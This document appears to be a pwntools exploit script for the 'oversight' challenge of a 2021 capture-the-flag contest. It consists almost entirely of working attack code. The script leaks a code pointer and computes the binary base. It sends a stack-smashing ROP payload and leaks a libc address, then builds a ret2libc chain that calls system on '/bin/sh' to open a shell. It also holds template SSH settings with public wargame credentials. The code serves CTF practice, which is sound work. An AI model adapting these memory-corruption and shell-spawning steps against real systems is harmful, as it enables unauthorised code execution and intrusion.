from pwn import ELF, process, ROP, remote, ssh, gdb, cyclic, cyclic_find, log, p64, u64  # Import pwntools
####################
#### CONNECTION ####
####################
LOCAL = True
REMOTETTCP = False
REMOTESSH = False
GDB = True

LOCAL_BIN = './oversight_patched'
REMOTE_BIN = '~/vuln' #For ssh
LIBC = ELF('./libc.so.6') #Set library path when know it

if LOCAL:
    P = process(LOCAL_BIN) # start the vuln binary
    ELF_LOADED = ELF(LOCAL_BIN)# Extract data from binary
    ROP_LOADED = ROP(ELF_LOADED)# Find ROP gadgets

elif REMOTETTCP:
    P = remote('pwn-2021.duc.tf', 31909) # start the vuln binary
    ELF_LOADED = ELF(LOCAL_BIN)# Extract data from binary
    ROP_LOADED = ROP(ELF_LOADED)# Find ROP gadgets

elif REMOTESSH:
    ssh_shell = ssh('bandit0', 'bandit.labs.overthewire.org', password='bandit0', port=2220)
    p = ssh_shell.process(REMOTE_BIN) # start the vuln binary
    elf = ELF(LOCAL_BIN)# Extract data from binary
    rop = ROP(elf)# Find ROP gadgets

if GDB and not REMOTETTCP and not REMOTESSH:
    # attach gdb and continue
    # You can set breakpoints, for example 'break *main'
    gdb.attach(P.pid,'b*echo_inner')



##########################
##### OFFSET FINDER ######
##########################

##############################
##### FINAL EXPLOITATION #####
##############################


#log.info('POP_RDI %s ' % hex(POP_RDI))
#log.info('bin/sh %s ' % hex(BINSH))
#log.info('system %s ' % hex(SYSTEM))
#log.info('exit %s ' % hex(EXIT))

P.sendline(b'')
P.sendline(b'1')
P.recvuntil(b'number is: ')
leak = int(P.recvline().strip(),16)
print(hex(leak))
code_base = leak - 0x20a2
#log.info('code_base ' % hex(code_base))

RET = code_base + 0x000000000000101a
main = code_base + 0x10b0
echo_inner = code_base + 0x13a0
POP_RDI = code_base + 0x0000000000001493
P.sendline(b'256')
P.send((p64(main)+p64(RET))*16)
P.sendline(b'')
P.sendline(b'12')
P.recvuntil(b'number is: ')

leak2 = int(P.recvline().strip(), 16)
print(hex(leak2))
LIBC.address = leak2-0x3e82a0
BINSH = LIBC.address + 0x1b3e1a
SYSTEM = LIBC.address + 0x000000000004f550

#offset = 0x61c170
P.sendline(b'256')
P.send(p64(RET)*29+p64(POP_RDI)+p64(BINSH)+p64(SYSTEM))
#P.send(p64(RET)*31+p64(code_base+0x1370))

P.interactive() #Interact with your shell :)
